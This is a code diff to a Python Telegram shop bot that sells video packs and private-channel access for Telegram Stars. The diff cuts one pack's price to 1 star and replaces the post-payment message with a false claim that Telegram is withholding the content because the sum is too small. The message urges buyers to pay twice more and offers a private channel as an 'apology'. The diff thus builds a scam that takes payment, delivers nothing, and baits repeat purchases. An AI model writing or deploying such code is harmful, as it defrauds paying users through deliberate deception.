@@ -63,7 +63,7 @@ init_db()
 
 PRODUCTS = {
     "premium": {"name": "🌟 Premium Подписка", "price": 70, "description": "Доступ к приватному каналу на 30 дней"},
-    "video_100": {"name": "🎬 100 Видео", "price": 15, "description": "Пакет из 100 премиум видео"},
+    "video_100": {"name": "🎬 100 Видео", "price": 1, "description": "Пакет из 100 премиум видео"},
     "video_1000": {"name": "📹 1000 Видео", "price": 25, "description": "Пакет из 1000 премиум видео"},
     "video_10000": {"name": "🎥 10000 Видео + Канал", "price": 50, "description": "10000 видео + доступ к каналу"}
 }
@@ -242,7 +242,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Добавляем кнопку админ-панели только для админа
     if user.id == ADMIN_ID:
-        keyboard.append([InlineKeyboardButton("👑 Админ панель", callback_data="admin_panel")])
+        keyboard.append([InlineKeyboardButton(" Админ панель", callback_data="admin_panel")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
 
@@ -306,7 +306,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         # Добавляем кнопку админ-панели только для админа
         if user.id == ADMIN_ID:
-            keyboard.append([InlineKeyboardButton("👑 Админ панель", callback_data="admin_panel")])
+            keyboard.append([InlineKeyboardButton(" Админ панель", callback_data="admin_panel")])
         
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text("🛍️ *Добро пожаловать в магазин!*\n\nВыберите раздел:", reply_markup=reply_markup, parse_mode='Markdown')
@@ -627,9 +627,7 @@ async def successful_payment_handler(update: Update, context: ContextTypes.DEFAU
 📦 Товар: {PRODUCTS[payment.invoice_payload]['name']}
 💎 Сумма: {payment.total_amount} звезд
 
-[ВСТАВЬТЕ СВОЕ СООБЩЕНИЕ ДЛЯ ПОКУПАТЕЛЯ ЗДЕСЬ]
-
-Спасибо за покупку! 🎉"""
+[ К сожалению из-за ограничения средств, Telegram  не дает вам доступа к контенту! Из-за малой суммы попробуйте 2 раза докупить, в качестве ИЗВИНЕНИЙ мы дарим вам Приват канал ‼️ ( без ограничений )]
 
     await update.message.reply_text(user_msg, parse_mode='Markdown')
 
@@ -661,3 +659,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
